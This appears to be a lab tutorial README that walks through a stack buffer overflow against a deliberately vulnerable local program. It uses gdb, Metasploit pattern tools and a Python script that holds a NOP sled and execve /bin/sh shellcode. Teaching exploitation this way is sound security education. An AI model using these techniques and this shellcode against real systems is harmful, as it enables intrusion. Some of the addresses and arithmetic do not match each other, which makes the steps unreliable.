# Buffer overflow example 

Disable randomize_va_space on kernel:
```shell
sudo sysctl kernel.randomize_va_space=0
```

Compile example
```shell
#gcc -o reto reto.c -fno-stack-protector -z execstack -g -fPIE
gcc -g -fno-stack-protector -z execstack -mpreferred-stack-boundary=4 -o reto reto.c
```

Execute compiled software with gdb:
```shell
gdb ./reto
```

input 100 E characters with python to reto
```shell
run $(python -c 'print ("E" * 100)')
```

Run metasploit module:
```shell
/opt/metasploit/tools/exploit/pattern_create.rb -l 130
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac
3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A
```

On debuger run pattern created with metasploit module:
```shell
gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A
Starting program: /home/darthv/Downloads/scripts/scripts/reto Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A

Program received signal SIGSEGV, Segmentation fault.
0x00005555555551d5 in main (argc=2, argv=0x7fffffffe6f8) at reto.c:18
18	}
(gdb) 
```

We've got a segmentation faul, buffer has been overfloaded. 

Let's check where buffer overflow has been, in other words, we want to know the teturn memmory addreess.
```shell
(gdb) x/xw $rsp #64 bits example, if we want 32 we'd use esp.
0x7fffffffe5e8:	0x41306541
(gdb) 
```

Let's get the exactly overflow point. We send a 130 string characters with. Remember var has only 100 chars defined: ``char buffer[100];``` Vars has bit more memory as has been defined, so now let's get the exactly overflow point (offset) in order to know exactly how many characters we need to overflow. Run patter_offest.rb with -q memmory address got from 130 chars:

```shell
/opt/metasploit/tools/exploit/pattern_offset.rb -q 41306541 -l 130
[*] Exact match at offset 120
```

This means that from all 130 chars we try before, when we get 120 chars is the exactly overfloint point, this is the direcction we need. To do that we need to dissamble or get the function premio, to know the function premio address: 

```shell
(gdb) disas premio
Dump of assembler code for function premio:
   0x0000555555555159 <+0>:	push   %rbp
   0x000055555555515a <+1>:	mov    %rsp,%rbp
   0x000055555555515d <+4>:	lea    0xea4(%rip),%rax        # 0x555555556008
   0x0000555555555164 <+11>:	mov    %rax,%rdi
   0x0000555555555167 <+14>:	call   0x555555555040 <puts@plt>
   0x000055555555516c <+19>:	nop
   0x000055555555516d <+20>:	pop    %rbp
   0x000055555555516e <+21>:	ret    
End of assembler dump.
(gdb) 
```

We've got the first address memory from premio function, the first one: 0x0000555555555159, exactly: 555555555159.
Now we're going to run the same python command we run before, but now with the exactly offset chars lenght (120) and with the address premio converted from: 555555555159. to \x59\x51\x55\x55\x55\x55. This convertion is for intel little endian, so we only need to put the memmory adreeces inverted addin x.

```shell
(python -c 'print ("A" * 120 + "\x59\x51\x55\x55\x55\x55")')

[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYQUUUU
ANGEL¡¡¡ has alterado el flujo del programa

Program received signal SIGSEGV, Segmentation fault.
```

# 2 GET SHELL CODE:
Check [shell](shell.py) code and get executable attributes.

```shell
(gdb) run $(./shell.py)
Starting program: /home/darthv/Downloads/scripts/scripts/reto $(./shell.py)
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
0x00005555555551d5 in main (argc=2, argv=0x7fffffffe6a8) at reto.c:18
18	}
(gdb) 

```

We'v got memory address argv=0x7fffffffe6a8. Now lets do break point just before strcpy, before print, this will get the addreess memory where we need to put the shell code:
```shell
(gdb) list
13	         return -1;
14	    }
15	    strcpy(buffer,argv[1]);
16	    printf ("%s\n",buffer);
17	    return 0; 
18	}
e9	
(gdb) break 15
Breakpoint 1 at 0x5555555551a9: file reto.c, line 15.
(gdb) 

```

We get memory address where we want to put shell code, we need to change [shell.py](shell.py) If we run shellp.py again with break point we've get check memory addres, after we need the stack return memmory address

```shell
(gdb) x/40x $rsp
0x7fffffffe510:	0xffffe6a8	0x00007fff	0x00008000	0x00000002
0x7fffffffe520:	0x00000000	0x00000000	0x00000006	0x0000009e
0x7fffffffe530:	0x0000000a	0x0000000c	0x00000000	0x00000000
0x7fffffffe540:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe550:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe560:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe570:	0x00000000	0x00000000	0xf7fe6b60	0x00007fff
0x7fffffffe580:	0x00000000	0x00000000	0xf7ffdab0	0x00007fff
0x7fffffffe590:	0x00000002	0x00000000	0xf7dca290	0x00007fff
0x7fffffffe5a0:	0xffffe690	0x00007fff	0x5555516f	0x00005555
(gdb) 
```

What is the return address we need to atack? used to be the 3rd (empty one)
0x 7f ff ff ff e5 30 -> \x30\xe5\xff\xff\xff\x7f

Now let's change [shell.py](shell.py) with rsp (return stack pointer) memory address and change to 120 characters:
```python
#!/usr/bin/python
nops = '\x90' * 64
shellCode = (
'\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69' +
'\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'
)
relleno = 'A' * (130 - 64 - 29)
regreso ='\x50\xe2\xff\xff\xff\x7f'
print (nops + shellCode + relleno + regreso)
```

Now clear break point and run shell.py:

```shell

```
